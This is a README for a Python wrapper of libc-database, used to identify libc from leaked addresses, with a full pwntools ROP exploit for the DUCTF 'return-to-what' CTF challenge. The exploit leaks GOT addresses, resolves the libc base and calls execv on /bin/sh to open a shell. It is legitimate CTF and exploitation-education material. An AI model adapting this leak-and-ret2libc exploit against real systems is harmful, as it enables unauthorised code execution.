# libc-resolver

A python wrapper of the awesome project https://github.com/niklasb/libc-database, a project made to determine a libc library from its runtime addresses.

This wrapper is made for pwntools exploit development, all credits for the search engine goes to niklasb.

# How to use

Clone the project and add the folder to your PYTHONPATH env variable, then simply import the module and do:
```python
from libc_resolver import libc_resolve

libc = libc_resolve({"__libc_start_main": 0x7f31aad5cfc0, "puts": 0x7f31aadbd5a0}, choice=1)
print(libc.symbols["system"])
```

## Practical exemple

Expoloit code for the returntowhat challenge from DUCTF, a simple ROP:

```python
from pwn import *
import struct
from libc_resolver import libc_resolve

exe = context.binary = ELF('return-to-what')
context.terminal = "gnome-terminal -- bash -c".split(" ")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REM:
        return remote("chal.duc.tf", 30003)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *0x4011ac
'''.format(**locals())

io = start()
io.recvuntil("to?\n")
offset = 56

rop = ROP(exe)
rop.puts(exe.got["__libc_start_main"])
rop.main()

io.sendline("a" * offset + rop.chain())
leak = io.recvline()[:-1]
leak = leak + "\0" * (8 - len(leak))
libc_start_main = struct.unpack("<Q", leak)[0]

io.recvuntil("to?\n")
rop = ROP(exe)
rop.puts(exe.got["puts"])
rop.main()

io.sendline("a" * offset + rop.chain())
leak = io.recvline()[:-1]
leak = leak + "\0" * (8 - len(leak))
puts = struct.unpack("<Q", leak)[0]

print("libc_start_main: 0x%x" % libc_start_main)
print("puts: 0x%x" % puts)

lib = libc_resolve({"__libc_start_main": libc_start_main, "puts": puts}, choice=1)
base = libc_start_main - lib.symbols["__libc_start_main"]

io.recvuntil("to?\n")
rop = ROP(exe)
rop.call(lib.symbols["execv"] + base, [next(lib.search("/bin/sh\0"))  + base, 0])
io.sendline("a" * offset + rop.chain())
io.interactive()
```
